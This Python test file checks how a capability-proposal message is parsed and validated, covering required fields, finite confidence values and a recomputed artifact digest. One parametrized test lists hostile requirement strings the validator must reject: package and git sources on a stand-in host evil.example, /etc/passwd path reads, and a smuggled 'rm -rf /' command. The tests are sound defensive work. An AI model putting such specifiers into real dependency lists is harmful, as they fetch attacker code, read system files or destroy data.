"""The one wire contract a resident-built capability travels to peers in."""

from __future__ import annotations

import pytest

from ravn.domain.capability_proposal import CapabilityProposal, CapabilityProposalError


def _agent_tool_payload(**overrides) -> dict:
    payload = {
        "learning_id": "learn-echo",
        "title": "echo_tool",
        "summary": "Echo the payload.",
        "artifact_type": "agent_tool",
        "flock_id": "k8s-valkyries",
        "domain": "k8s",
        "scope": "flock",
        "source_environment_id": "cluster-a",
        "source_valkyrie_id": "valkyrie:k8s-a",
        "confidence": 0.74,
        "redaction_status": "none",
        "promotion_id": "learn-echo",
        "tool_code": "def run(input):\n    return {'echo': input}\n",
        "tool_entry_point": "run",
        "learned_tool_manifest": {
            "name": "echo_tool",
            "description": "Echo the payload.",
            "input_schema": {"type": "object"},
            "required_permission": "tool:run",
        },
        "test_code": "import _verify_tool\n\ndef test_echo():\n    pass\n",
        "requirements": ["requests"],
        "canary_sample": {"a": 1},
        "builder_evidence": {"verification": {"ok": True}},
        "review_outcome": "self_registered",
    }
    payload.update(overrides)
    return payload


class TestFromEventPayload:
    def test_parses_a_complete_agent_tool_proposal(self) -> None:
        proposal = CapabilityProposal.from_event_payload(_agent_tool_payload())

        assert proposal.learning_id == "learn-echo"
        assert proposal.tool_code.startswith("def run")
        assert proposal.test_code.strip().startswith("import _verify_tool")
        assert proposal.requirements == ["requests"]
        assert proposal.canary_sample == {"a": 1}
        assert proposal.builder_evidence == {"verification": {"ok": True}}
        assert proposal.learned_tool_manifest["name"] == "echo_tool"

    def test_missing_learning_id_is_declined(self) -> None:
        payload = _agent_tool_payload()
        del payload["learning_id"]

        with pytest.raises(CapabilityProposalError):
            CapabilityProposal.from_event_payload(payload)

    def test_agent_tool_with_no_tool_code_is_declined(self) -> None:
        payload = _agent_tool_payload(tool_code="")

        with pytest.raises(CapabilityProposalError, match="carries no tool_code"):
            CapabilityProposal.from_event_payload(payload)

    def test_agent_tool_with_unnamed_manifest_is_declined(self) -> None:
        payload = _agent_tool_payload(learned_tool_manifest={"description": "no name"})

        with pytest.raises(CapabilityProposalError, match="no name"):
            CapabilityProposal.from_event_payload(payload)

    def test_valid_requirement_specifiers_are_accepted(self) -> None:
        payload = _agent_tool_payload(
            requirements=["requests", "numpy==1.26.4", "pandas>=2.0,<3.0", "foo[extra]==1.0"]
        )

        proposal = CapabilityProposal.from_event_payload(payload)

        assert proposal.requirements == [
            "requests",
            "numpy==1.26.4",
            "pandas>=2.0,<3.0",
            "foo[extra]==1.0",
        ]

    @pytest.mark.parametrize(
        "requirement",
        [
            "--index-url=https://evil.example/simple",
            "-e git+https://evil.example/repo.git",
            "git+https://evil.example/repo.git",
            "/etc/passwd",
            "../../etc/passwd",
            "requests; os.system('rm -rf /')",
            "requests --target=/tmp/evil",
        ],
    )
    def test_unsafe_requirement_specifiers_are_declined(self, requirement: str) -> None:
        payload = _agent_tool_payload(requirements=[requirement])

        with pytest.raises(CapabilityProposalError, match="unsafe or invalid requirement"):
            CapabilityProposal.from_event_payload(payload)

    def test_requirements_as_a_bare_string_is_declined_not_split_into_characters(self) -> None:
        payload = _agent_tool_payload(requirements="requests")

        with pytest.raises(CapabilityProposalError, match="must be a list"):
            CapabilityProposal.from_event_payload(payload)

    def test_requirements_with_a_non_string_entry_is_declined(self) -> None:
        payload = _agent_tool_payload(requirements=[{"name": "requests"}])

        with pytest.raises(CapabilityProposalError, match="entries must be strings"):
            CapabilityProposal.from_event_payload(payload)

    def test_non_string_tool_code_is_declined_not_silently_stringified(self) -> None:
        payload = _agent_tool_payload(tool_code={"not": "code"})

        with pytest.raises(CapabilityProposalError, match="tool_code.*must be a string"):
            CapabilityProposal.from_event_payload(payload)

    def test_nan_confidence_is_declined(self) -> None:
        payload = _agent_tool_payload(confidence=float("nan"))

        with pytest.raises(CapabilityProposalError, match="finite number"):
            CapabilityProposal.from_event_payload(payload)

    def test_infinite_confidence_is_declined(self) -> None:
        payload = _agent_tool_payload(confidence=float("inf"))

        with pytest.raises(CapabilityProposalError, match="finite number"):
            CapabilityProposal.from_event_payload(payload)

    def test_non_agent_tool_proposal_needs_no_tool_code(self) -> None:
        payload = _agent_tool_payload(
            artifact_type="ravn_skill_tool",
            tool_code="",
            learned_tool_manifest={},
            content="# a markdown skill",
        )

        proposal = CapabilityProposal.from_event_payload(payload)

        assert proposal.artifact_type == "ravn_skill_tool"
        assert proposal.content == "# a markdown skill"

    def test_falls_back_to_legacy_key_aliases(self) -> None:
        payload = _agent_tool_payload()
        payload["artifact_content"] = payload.pop("content", "") or "legacy content"
        payload["environment_id"] = payload.pop("source_environment_id")
        payload["promoted_path"] = "learnings/echo.md"

        proposal = CapabilityProposal.from_event_payload(payload)

        assert proposal.content == "legacy content"
        assert proposal.source_environment_id == "cluster-a"
        assert proposal.artifact_path == "learnings/echo.md"


class TestArtifactDigest:
    def test_digest_is_stable_for_identical_content(self) -> None:
        first = CapabilityProposal.from_event_payload(_agent_tool_payload())
        second = CapabilityProposal.from_event_payload(_agent_tool_payload())

        assert first.artifact_digest == second.artifact_digest

    def test_digest_changes_with_tool_code(self) -> None:
        first = CapabilityProposal.from_event_payload(_agent_tool_payload())
        second = CapabilityProposal.from_event_payload(
            _agent_tool_payload(tool_code="def run(input):\n    return {'echo2': input}\n")
        )

        assert first.artifact_digest != second.artifact_digest

    def test_digest_is_recomputed_never_trusted_from_the_wire(self) -> None:
        """A digest carried on an incoming payload is never accepted as-is —
        CapabilityProposal has no field for it, and to_event_payload always
        recomputes it from the fields that were actually parsed."""
        payload = _agent_tool_payload()
        payload["artifact_digest"] = "not-a-real-digest"

        proposal = CapabilityProposal.from_event_payload(payload)

        assert proposal.artifact_digest != "not-a-real-digest"


class TestRoundTrip:
    def test_to_event_payload_round_trips_through_from_event_payload(self) -> None:
        original = CapabilityProposal.from_event_payload(_agent_tool_payload())

        rehydrated = CapabilityProposal.from_event_payload(original.to_event_payload())

        assert rehydrated == original

    def test_to_event_payload_carries_a_digest(self) -> None:
        proposal = CapabilityProposal.from_event_payload(_agent_tool_payload())

        payload = proposal.to_event_payload()

        assert payload["artifact_digest"] == proposal.artifact_digest
